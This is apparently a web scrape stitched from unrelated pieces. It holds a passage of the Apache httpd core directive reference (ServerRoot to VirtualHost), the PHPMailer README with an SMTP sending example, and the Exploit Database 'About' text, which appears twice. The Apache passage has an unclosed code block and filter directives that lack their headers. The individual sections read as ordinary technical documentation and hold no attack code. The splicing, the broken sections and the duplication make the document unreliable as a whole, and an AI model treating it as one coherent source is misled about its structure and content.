self-referential URLs.

See the description of the
`[UseCanonicalName](#usecanonicalname)` and
`[UseCanonicalPhysicalPort](#usecanonicalphysicalport)` directives for
settings which determine whether self-referential URLs (e.g., by the
`[mod_dir](../mod/mod_dir.html)` module) will refer to the
specified port, or to the port number given in the client's request.

Failure to set `ServerName` to a name that
your server can resolve to an IP address will result in a startup
warning. `httpd` will then use whatever hostname it can
determine, using the system's `hostname` command. This
will almost never be the hostname you actually want.

`httpd: Could not reliably determine the server's fully qualified domain name, using rocinante.local for ServerName`

## ServerRoot Directive

| [Description:](directive-dict.html#Description) | Base directory for the server installation |

| [Syntax:](directive-dict.html#Syntax) | `ServerRoot directory-path` |
| [Default:](directive-dict.html#Default) | `ServerRoot /usr/local/apache` |
| [Context:](directive-dict.html#Context) | server config |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |

The `ServerRoot` directive sets the
directory in which the server lives. Typically it will contain the
subdirectories `conf/` and `logs/`. Relative
paths in other configuration directives (such as `[Include](#include)` or `[LoadModule](../mod/mod_so.html#loadmodule)`, for example) are taken as
relative to this directory.

```
ServerRoot "/home/httpd"
```

The default location of `ServerRoot` may be
modified by using the `--prefix` argument to
[`configure`](../programs/configure.html), and
most third-party distributions of the server have a different
default location from the one listed above.

## ServerSignature Directive

| [Description:](directive-dict.html#Description) | Configures the footer on server-generated documents |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `ServerSignature On|Off|EMail` |
| [Default:](directive-dict.html#Default) | `ServerSignature Off` |
| [Context:](directive-dict.html#Context) | server config, virtual host, directory, .htaccess |
| [Override:](directive-dict.html#Override) | All |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |

The `ServerSignature` directive allows the
configuration of a trailing footer line under server-generated
documents (error messages, `[mod_proxy](../mod/mod_proxy.html)` ftp directory
listings, `[mod_info](../mod/mod_info.html)` output, ...). The reason why you
would want to enable such a footer line is that in a chain of proxies,
the user often has no possibility to tell which of the chained servers
actually produced a returned error message.

The `Off`
setting, which is the default, suppresses the footer line.
The `On` setting simply adds a line with the
server version number and `[ServerName](#servername)` of the serving virtual host,
and the `EMail` setting additionally creates a
"mailto:" reference to the `[ServerAdmin](#serveradmin)` of the referenced
document.

The details of the server version number
presented are controlled by the `[ServerTokens](#servertokens)` directive.

### See also

* `[ServerTokens](#servertokens)`

[![top](../images/up.gif)](#page-header)
## ServerTokens Directive

| [Description:](directive-dict.html#Description) | Configures the `Server` HTTP response header |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `ServerTokens Major|Minor|Min[imal]|Prod[uctOnly]|OS|Full` |
| [Default:](directive-dict.html#Default) | `ServerTokens Full` |
| [Context:](directive-dict.html#Context) | server config |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |

This directive controls whether `Server` response
header field which is sent back to clients includes a
description of the generic OS-type of the server as well as
information about compiled-in modules.

`ServerTokens Full` (or not specified)
Server sends (*e.g.*): `Server: Apache/2.4.2
(Unix) PHP/4.2.2 MyMod/1.2`
`ServerTokens Prod[uctOnly]`
Server sends (*e.g.*): `Server:
Apache`
`ServerTokens Major`
Server sends (*e.g.*): `Server:
Apache/2`
`ServerTokens Minor`
Server sends (*e.g.*): `Server:
Apache/2.4`
`ServerTokens Min[imal]`
Server sends (*e.g.*): `Server:
Apache/2.4.2`
`ServerTokens OS`
Server sends (*e.g.*): `Server: Apache/2.4.2
(Unix)`

This setting applies to the entire server, and cannot be
enabled or disabled on a virtualhost-by-virtualhost basis.

This directive also controls the
information presented by the `[ServerSignature](#serversignature)` directive.

Setting `ServerTokens` to less than
`minimal` is not recommended because it makes it more
difficult to debug interoperational problems. Also note that
disabling the Server: header does nothing at all to make your
server more secure. The idea of "security through obscurity"
is a myth and leads to a false sense of safety.

## SetHandler Directive

| [Description:](directive-dict.html#Description) | Forces all matching files to be processed by a handler |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `SetHandler handler-name|none|expression` |
| [Context:](directive-dict.html#Context) | server config, virtual host, directory, .htaccess |
| [Override:](directive-dict.html#Override) | FileInfo |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |
| [Compatibility:](directive-dict.html#Compatibility) | expression argument 2.4.19 and later |

When placed into an `.htaccess` file or a
`[<Directory>](#directory)` or
`[<Location>](#location)`
section, this directive forces all matching files to be parsed
through the [handler](../handler.html) given by
handler-name. For example, if you had a directory you
wanted to be parsed entirely as imagemap rule files, regardless
of extension, you might put the following into an
`.htaccess` file in that directory:

```
SetHandler imap-file
```

Another example: if you wanted to have the server display a
status report whenever a URL of
`http://servername/status` was called, you might put
the following into `httpd.conf`:

```
<Location "/status">
  SetHandler server-status
</Location>
```

You could also use this directive to configure a particular
handler for files with a particular file extension. For example:

```
<FilesMatch "\.php$">
    SetHandler application/x-httpd-php
</FilesMatch>
```

String-valued expressions can be used to reference per-request
variables, including backreferences to named regular expressions:

```
<LocationMatch ^/app/(?<sub>[^/]+)/>
     SetHandler "proxy:unix:/var/run/app_%{env:MATCH_sub}.sock|fcgi://localhost:8080"
</LocationMatch>
```

You can override an earlier defined `SetHandler`
directive by using the value `None`.

### Note

Because `SetHandler` overrides default handlers,
normal behavior such as handling of URLs ending in a slash (/) as
directories or index files is suppressed.

The `SetInputFilter` directive sets the
filter or filters which will process client requests and POST
input when they are received by the server. This is in addition to
any filters defined elsewhere, including the
`[AddInputFilter](../mod/mod_mime.html#addinputfilter)`
directive.

If more than one filter is specified, they must be separated
by semicolons in the order in which they should process the
content.

| [Context:](directive-dict.html#Context) | server config, virtual host, directory, .htaccess |
| [Override:](directive-dict.html#Override) | FileInfo |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |

The `SetOutputFilter` directive sets the filters
which will process responses from the server before they are
sent to the client. This is in addition to any filters defined
elsewhere, including the
`[AddOutputFilter](../mod/mod_mime.html#addoutputfilter)`
directive.

For example, the following configuration will process all files
in the `/www/data/` directory for server-side
includes.

```
<Directory "/www/data/">
  SetOutputFilter INCLUDES
</Directory>

## StrictHostCheck Directive

| [Description:](directive-dict.html#Description) | Controls whether the server requires the requested hostname be listed enumerated in the virtual host handling the request |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `StrictHostCheck ON|OFF` |
| [Default:](directive-dict.html#Default) | `StrictHostCheck OFF` |
| [Context:](directive-dict.html#Context) | server config, virtual host |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |
| [Compatibility:](directive-dict.html#Compatibility) | Added in 2.4.49 |

By default, the server will respond to requests for any hostname,
including requests addressed to unexpected or unconfigured hostnames.
While this is convenient, it is sometimes desirable to limit what hostnames
a backend application handles since it will often generate self-referential
responses.

By setting `StrictHostCheck` to *ON*,
the server will return an HTTP 400 error if the requested hostname
hasn't been explicitly listed by either `[ServerName](#servername)` or `[ServerAlias](#serveralias)` in the virtual host that best matches the
details of the incoming connection.

This directive also allows matching of the requested hostname to hostnames
specified within the opening `[VirtualHost](#virtualhost)`
tag, which is a relatively obscure configuration mechanism that acts like
additional `[ServerAlias](#serveralias)` entries.

This directive has no affect in non-default virtual hosts. The value
inherited from the global server configuration, or the default virtualhost
for the ip:port the underlying connection, determine the effective value.

## TimeOut Directive

| [Description:](directive-dict.html#Description) | Amount of time the server will wait for certain events before failing a request |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `TimeOut seconds` |
| [Default:](directive-dict.html#Default) | `TimeOut 60` |
| [Context:](directive-dict.html#Context) | server config, virtual host |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |

The `TimeOut` directive defines the length
of time Apache httpd will wait for I/O in various circumstances:

* When reading data from the client, the length of time to
  wait for a TCP packet to arrive if the read buffer is
  empty.

  For initial data on a new connection, this directive doesn't
  take effect until after any configured `[AcceptFilter](#acceptfilter)` has passed the new connection to the server.
* When writing data to the client, the length of time to wait
  for an acknowledgement of a packet if the send buffer is
  full.
* In `[mod_cgi](../mod/mod_cgi.html)` and `[mod_cgid](../mod/mod_cgid.html)`,
  the length of time to wait for any individual block of output
  from a CGI script.
* In `[mod_ext_filter](../mod/mod_ext_filter.html)`, the length of time to
  wait for output from a filtering process.
* In `[mod_proxy](../mod/mod_proxy.html)`, the default timeout value if
  `[ProxyTimeout](../mod/mod_proxy.html#proxytimeout)` is not
  configured.

[![top](../images/up.gif)](#page-header)
## TraceEnable Directive

| [Description:](directive-dict.html#Description) | Determines the behavior on `TRACE` requests |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `TraceEnable [on|off|extended]` |
| [Default:](directive-dict.html#Default) | `TraceEnable on` |
| [Context:](directive-dict.html#Context) | server config, virtual host |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |

This directive overrides the behavior of `TRACE` for both
the core server and `[mod_proxy](../mod/mod_proxy.html)`. The default
`TraceEnable on` permits `TRACE` requests per
RFC 2616, which disallows any request body to accompany the request.
`TraceEnable off` causes the core server and
`[mod_proxy](../mod/mod_proxy.html)` to return a `405` (Method not
allowed) error to the client.

Finally, for testing and diagnostic purposes only, request
bodies may be allowed using the non-compliant `TraceEnable
extended` directive. The core (as an origin server) will
restrict the request body to 64Kb (plus 8Kb for chunk headers if
`Transfer-Encoding: chunked` is used). The core will
reflect the full headers and all chunk headers with the response
body. As a proxy server, the request body is not restricted to 64Kb.

### Note

Despite claims to the contrary, enabling the `TRACE`
method does not expose any security vulnerability in Apache httpd.
The `TRACE` method is defined by the HTTP/1.1
specification and implementations are expected to support it.

[![top](../images/up.gif)](#page-header)
## UNCList Directive

| [Description:](directive-dict.html#Description) | Controls what UNC host names can be accessed by the server |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `UNCList hostname [hostname...]` |
| [Default:](directive-dict.html#Default) | `unset` |
| [Context:](directive-dict.html#Context) | server config |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |
| [Compatibility:](directive-dict.html#Compatibility) | Added in 2.4.60, Windows only. |

During request processing, requests to access a filesystem path that
resolves to a UNC path will fail unless the hostname in the UNC path
has been specified by this directive. The intent is to limit access to
paths derived from untrusted inputs.

```
UNCList example.com other.example.com
```
### Security

UNC paths accessed outside of request processing, such as during startup,
are not necessarily checked against the hosts configured with this directive.

### Directive Ordering

This directive should be placed before UNC paths used in httpd.conf.
Multiple occurrences of the directive reset the list.

[![top](../images/up.gif)](#page-header)
## UnDefine Directive

| [Description:](directive-dict.html#Description) | Undefine the existence of a variable |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `UnDefine parameter-name` |
| [Context:](directive-dict.html#Context) | server config |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |

Undoes the effect of a `[Define](#define)` or
of passing a `-D` argument to `[httpd](../programs/httpd.html)`.

This directive can be used to toggle the use of `[<IfDefine>](#ifdefine)` sections without needing to alter
`-D` arguments in any startup scripts.

Variable names may not contain colon ":" characters, to avoid clashes
with `[RewriteMap](../mod/mod_rewrite.html#rewritemap)`'s syntax.

### Virtual Host scope and pitfalls

While this directive is supported in virtual host context,
the changes it makes are visible to any later configuration
directives, beyond any enclosing virtual host.

## UseCanonicalName Directive

| [Description:](directive-dict.html#Description) | Configures how the server determines its own name and port |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `UseCanonicalName On|Off|DNS` |
| [Default:](directive-dict.html#Default) | `UseCanonicalName Off` |
| [Context:](directive-dict.html#Context) | server config, virtual host, directory |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |

In many situations Apache httpd must construct a *self-referential*
URL -- that is, a URL that refers back to the same server. With
`UseCanonicalName On` Apache httpd will use the hostname and port
specified in the `[ServerName](#servername)`
directive to construct the canonical name for the server. This name
is used in all self-referential URLs, and for the values of
`SERVER_NAME` and `SERVER_PORT` in CGIs.

With `UseCanonicalName Off` Apache httpd will form
self-referential URLs using the hostname and port supplied by
the client if any are supplied (otherwise it will use the
canonical name, as defined above). These values are the same
that are used to implement [name-based virtual hosts](../vhosts/name-based.html)
and are available with the same clients. The CGI variables
`SERVER_NAME` and `SERVER_PORT` will be
constructed from the client supplied values as well.

An example where this may be useful is on an intranet server
where you have users connecting to the machine using short
names such as `www`. You'll notice that if the users
type a shortname and a URL which is a directory, such as
`http://www/splat`, *without the trailing
slash*, then Apache httpd will redirect them to
`http://www.example.com/splat/`. If you have
authentication enabled, this will cause the user to have to
authenticate twice (once for `www` and once again
for `www.example.com` -- see [the FAQ on this subject for more information](http://wiki.apache.org/httpd/FAQ#Why_does_Apache_ask_for_my_password_twice_before_serving_a_file.3F)). But if
`UseCanonicalName` is set `Off`, then
Apache httpd will redirect to `http://www/splat/`.

There is a third option, `UseCanonicalName DNS`,
which is intended for use with mass IP-based virtual hosting to
support ancient clients that do not provide a
`Host:` header. With this option, Apache httpd does a
reverse DNS lookup on the server IP address that the client
connected to in order to work out self-referential URLs.

### Warning

If CGIs make assumptions about the values of `SERVER_NAME`,
they may be broken by this option. The client is essentially free
to give whatever value they want as a hostname. But if the CGI is
only using `SERVER_NAME` to construct self-referential URLs,
then it should be just fine.

## UseCanonicalPhysicalPort Directive

| [Description:](directive-dict.html#Description) | Configures how the server determines its own port |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `UseCanonicalPhysicalPort On|Off` |
| [Default:](directive-dict.html#Default) | `UseCanonicalPhysicalPort Off` |
| [Context:](directive-dict.html#Context) | server config, virtual host, directory |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |

In many situations Apache httpd must construct a *self-referential*
URL -- that is, a URL that refers back to the same server. With
`UseCanonicalPhysicalPort On`, Apache httpd will, when
constructing the canonical port for the server to honor
the `[UseCanonicalName](#usecanonicalname)` directive,
provide the actual physical port number being used by this request
as a potential port. With `UseCanonicalPhysicalPort Off`,
Apache httpd will not ever use the actual physical port number, instead
relying on all configured information to construct a valid port number.

### Note

The ordering of the lookup when the physical port is used is as
follows:

`UseCanonicalName On`

1. Port provided in `[Servername](#servername)`
2. Physical port
3. Default port for the scheme/protocol (such as 80 or 443)

`UseCanonicalName Off | DNS`

1. Parsed port from `Host:` header
2. Physical port
3. Port provided in `[Servername](#servername)`
4. Default port for the scheme/protocol (such as 80 or 443)

With `UseCanonicalPhysicalPort Off`, the
physical ports are removed from the ordering.

[![top](../images/up.gif)](#page-header)
## <VirtualHost> Directive

| [Description:](directive-dict.html#Description) | Contains directives that apply only to a specific hostname or IP address |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `<VirtualHost addr[:port] [addr[:port]] ...> ... </VirtualHost>` |
| [Context:](directive-dict.html#Context) | server config |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |

`<VirtualHost>` and
`</VirtualHost>` are used to enclose a group of
directives that will apply only to a particular virtual host. Any
directive that is allowed in a virtual host context may be
used. When the server receives a request for a document on a
particular virtual host, it uses the configuration directives
enclosed in the `<VirtualHost>`
section. Addr can be any of the following, optionally followed by
a colon and a port number (or \*):

* The IP address of the virtual host;
* A fully qualified domain name for the IP address of the
  virtual host (not recommended);
* The character `*`, which acts as a wildcard and matches
  any IP address.
* The string `_default_`, which is an alias for `*`

```
<VirtualHost 10.1.2.3:80>
  ServerAdmin webmaster@host.example.com
  DocumentRoot "/www/docs/host.example.com"
  ServerName host.example.com
  ErrorLog "logs/host.example.com-error_log"
  TransferLog "logs/host.example.com-access_log"
</VirtualHost>
```

IPv6 addresses must be specified in square brackets because
the optional port number could not be determined otherwise. An
IPv6 example is shown below:

```
<VirtualHost [2001:db8::a00:20ff:fea7:ccea]:80>
  ServerAdmin webmaster@host.example.com
  DocumentRoot "/www/docs/host.example.com"
  ServerName host.example.com
  ErrorLog "logs/host.example.com-error_log"
  TransferLog "logs/host.example.com-access_log"
</VirtualHost>
```

Each Virtual Host must correspond to a different IP address,
different port number, or a different host name for the server,
in the former case the server machine must be configured to
accept IP packets for multiple addresses. (If the machine does
not have multiple network interfaces, then this can be
accomplished with the `ifconfig alias` command -- if
your OS supports it).

### Note

The use of `<VirtualHost>` does
**not** affect what addresses Apache httpd listens on. You
may need to ensure that Apache httpd is listening on the correct addresses
using `[Listen](../mod/mpm_common.html#listen)`.

A `[ServerName](#servername)` should be
specified inside each `<VirtualHost>` block. If it is absent, the
`[ServerName](#servername)` from the "main"
server configuration will be inherited.

When a request is received, the server first maps it to the best matching
`<VirtualHost>` based on the local
IP address and port combination only. Non-wildcards have a higher
precedence. If no match based on IP and port occurs at all, the
"main" server configuration is used.

If multiple virtual hosts contain the best matching IP address and port,
the server selects from these virtual hosts the best match based on the
requested hostname. If no matching name-based virtual host is found,
then the first listed virtual host that matched the IP address will be
used. As a consequence, the first listed virtual host for a given IP address
and port combination is the default virtual host for that IP and port
combination.

### Security

See the [security tips](../misc/security_tips.html)
document for details on why your security could be compromised if the
directory where log files are stored is writable by anyone other
than the user that starts the server.

## Why you might need it

Many PHP developers need to send email from their code. The only PHP function that supports this directly is [`mail()`](https://www.php.net/manual/en/function.mail.php). However, it does not provide any assistance for making use of popular features such as encryption, authentication, HTML messages, and attachments.

Formatting email correctly is surprisingly difficult. There are myriad overlapping (and conflicting) standards, requiring tight adherence to horribly complicated formatting and encoding rules – the vast majority of code that you'll find online that uses the `mail()` function directly is just plain wrong, if not unsafe!

The PHP `mail()` function usually sends via a local mail server, typically fronted by a `sendmail` binary on Linux, BSD, and macOS platforms, however, Windows usually doesn't include a local mail server; PHPMailer's integrated SMTP client allows email sending on all platforms without needing a local mail server. Be aware though, that the `mail()` function should be avoided when possible; it's both faster and [safer](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html) to use SMTP to localhost.

*Please* don't be tempted to do it yourself – if you don't use PHPMailer, there are many other excellent libraries that
you should look at before rolling your own. Try [SwiftMailer](https://swiftmailer.symfony.com/)
, [Laminas/Mail](https://docs.laminas.dev/laminas-mail/), [ZetaComponents](https://github.com/zetacomponents/Mail), etc.

Please read [LICENSE](https://github.com/PHPMailer/PHPMailer/blob/master/LICENSE) for information on the software availability and distribution.

## Installation & loading

PHPMailer is available on [Packagist](https://packagist.org/packages/phpmailer/phpmailer) (using semantic versioning), and installation via [Composer](https://getcomposer.org) is the recommended way to install PHPMailer. Just add this line to your `composer.json` file:

```
"phpmailer/phpmailer": "^6.9.2"
```

or run

```
composer require phpmailer/phpmailer
```

Note that the `vendor` folder and the `vendor/autoload.php` script are generated by Composer; they are not part of PHPMailer.

If you want to use XOAUTH2 authentication, you will also need to add a dependency on the `league/oauth2-client` and appropriate service adapters package in your `composer.json`, or take a look at
by @decomplexity's [SendOauth2 wrapper](https://github.com/decomplexity/SendOauth2), especially if you're using Microsoft services.

Alternatively, if you're not using Composer, you
can [download PHPMailer as a zip file](https://github.com/PHPMailer/PHPMailer/archive/master.zip), (note that docs and examples are not included in the zip file), then copy the contents of the PHPMailer folder into one of the `include_path` directories specified in your PHP configuration and load each class file manually:

```
<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'path/to/PHPMailer/src/Exception.php';
require 'path/to/PHPMailer/src/PHPMailer.php';
require 'path/to/PHPMailer/src/SMTP.php';
```

If you're not using the `SMTP` class explicitly (you're probably not), you don't need a `use` line for the SMTP class. Even if you're not using exceptions, you do still need to load the `Exception` class as it is used internally.

## Legacy versions

PHPMailer 5.2 (which is compatible with PHP 5.0 — 7.0) is no longer supported, even for security updates. You will find the latest version of 5.2 in the [5.2-stable branch](https://github.com/PHPMailer/PHPMailer/tree/5.2-stable). If you're using PHP 5.5 or later (which you should be), switch to the 6.x releases.

### Upgrading from 5.2

The biggest changes are that source files are now in the `src/` folder, and PHPMailer now declares the namespace `PHPMailer\PHPMailer`. This has several important effects – [read the upgrade guide](https://github.com/PHPMailer/PHPMailer/tree/master/UPGRADING.md) for more details.

### Minimal installation

While installing the entire package manually or with Composer is simple, convenient, and reliable, you may want to include only vital files in your project. At the very least you will need [src/PHPMailer.php](https://github.com/PHPMailer/PHPMailer/tree/master/src/PHPMailer.php). If you're using SMTP, you'll need [src/SMTP.php](https://github.com/PHPMailer/PHPMailer/tree/master/src/SMTP.php), and if you're using POP-before SMTP (*very* unlikely!), you'll need [src/POP3.php](https://github.com/PHPMailer/PHPMailer/tree/master/src/POP3.php). You can skip the [language](https://github.com/PHPMailer/PHPMailer/tree/master/language/) folder if you're not showing errors to users and can make do with English-only errors. If you're using XOAUTH2 you will need [src/OAuth.php](https://github.com/PHPMailer/PHPMailer/tree/master/src/OAuth.php) as well as the Composer dependencies for the services you wish to authenticate with. Really, it's much easier to use Composer!

## A Simple Example

```
<?php
//Import PHPMailer classes into the global namespace
//These must be at the top of your script, not inside a function
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

//Load Composer's autoloader
require 'vendor/autoload.php';

//Create an instance; passing `true` enables exceptions
$mail = new PHPMailer(true);

try {
    //Server settings
    $mail->SMTPDebug = SMTP::DEBUG_SERVER;                      //Enable verbose debug output
    $mail->isSMTP();                                            //Send using SMTP
    $mail->Host       = 'smtp.example.com';                     //Set the SMTP server to send through
    $mail->SMTPAuth   = true;                                   //Enable SMTP authentication
    $mail->Username   = 'user@example.com';                     //SMTP username
    $mail->Password   = 'secret';                               //SMTP password
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;            //Enable implicit TLS encryption
    $mail->Port       = 465;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`

    //Recipients
    $mail->setFrom('from@example.com', 'Mailer');
    $mail->addAddress('joe@example.net', 'Joe User');     //Add a recipient
    $mail->addAddress('ellen@example.com');               //Name is optional
    $mail->addReplyTo('info@example.com', 'Information');
    $mail->addCC('cc@example.com');
    $mail->addBCC('bcc@example.com');

    //Attachments
    $mail->addAttachment('/var/tmp/file.tar.gz');         //Add attachments
    $mail->addAttachment('/tmp/image.jpg', 'new.jpg');    //Optional name

    //Content
    $mail->isHTML(true);                                  //Set email format to HTML
    $mail->Subject = 'Here is the subject';
    $mail->Body    = 'This is the HTML message body <b>in bold!</b>';
    $mail->AltBody = 'This is the body in plain text for non-HTML mail clients';

    $mail->send();
    echo 'Message has been sent';
} catch (Exception $e) {
    echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
}
```

You'll find plenty to play with in the [examples](https://github.com/PHPMailer/PHPMailer/tree/master/examples) folder, which covers many common scenarios including sending through Gmail, building contact forms, sending to mailing lists, and more.

If you are re-using the instance (e.g. when sending to a mailing list), you may need to clear the recipient list to avoid sending duplicate messages. See [the mailing list example](https://github.com/PHPMailer/PHPMailer/blob/master/examples/mailing_list.phps) for further guidance.

That's it. You should now be ready to use PHPMailer!

## Localization

PHPMailer defaults to English, but in the [language](https://github.com/PHPMailer/PHPMailer/tree/master/language/) folder, you'll find many translations for PHPMailer error messages that you may encounter. Their filenames contain [ISO 639-1](https://en.wikipedia.org/wiki/ISO_639-1) language code for the translations, for example `fr` for French. To specify a language, you need to tell PHPMailer which one to use, like this:

```
//To load the French version
$mail->setLanguage('fr', '/optional/path/to/language/directory/');
```

We welcome corrections and new languages – if you're looking for corrections, run the [Language/TranslationCompletenessTest.php](https://github.com/PHPMailer/PHPMailer/blob/master/test/Language/TranslationCompletenessTest.php) script in the tests folder and it will show any missing translations.

## Documentation

Start reading at the [GitHub wiki](https://github.com/PHPMailer/PHPMailer/wiki). If you're having trouble, head for [the troubleshooting guide](https://github.com/PHPMailer/PHPMailer/wiki/Troubleshooting) as it's frequently updated.

Examples of how to use PHPMailer for common scenarios can be found in the [examples](https://github.com/PHPMailer/PHPMailer/tree/master/examples) folder. If you're looking for a good starting point, we recommend you start with [the Gmail example](https://github.com/PHPMailer/PHPMailer/tree/master/examples/gmail.phps).

To reduce PHPMailer's deployed code footprint, examples are not included if you load PHPMailer via Composer or via [GitHub's zip file download](https://github.com/PHPMailer/PHPMailer/archive/master.zip), so you'll need to either clone the git repository or use the above links to get to the examples directly.

Complete generated API documentation is [available online](https://phpmailer.github.io/PHPMailer/).

You can generate complete API-level documentation by running `phpdoc` in the top-level folder, and documentation will appear in the `docs` folder, though you'll need to have [PHPDocumentor](https://www.phpdoc.org) installed. You may find [the unit tests](https://github.com/PHPMailer/PHPMailer/blob/master/test/PHPMailer/PHPMailerTest.php) a good reference for how to do various operations such as encryption.

If the documentation doesn't cover what you need, search the [many questions on Stack Overflow](https://stackoverflow.com/questions/tagged/phpmailer), and before you ask a question about "SMTP Error: Could not connect to SMTP host.", [read the troubleshooting guide](https://github.com/PHPMailer/PHPMailer/wiki/Troubleshooting).

## Tests

[PHPMailer tests](https://github.com/PHPMailer/PHPMailer/tree/master/test/) use PHPUnit 9, with [a polyfill](https://github.com/Yoast/PHPUnit-Polyfills) to let 9-style tests run on older PHPUnit and PHP versions.

[![Test status](https://github.com/PHPMailer/PHPMailer/workflows/Tests/badge.svg)](https://github.com/PHPMailer/PHPMailer/actions)

If this isn't passing, is there something you can do to help?

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
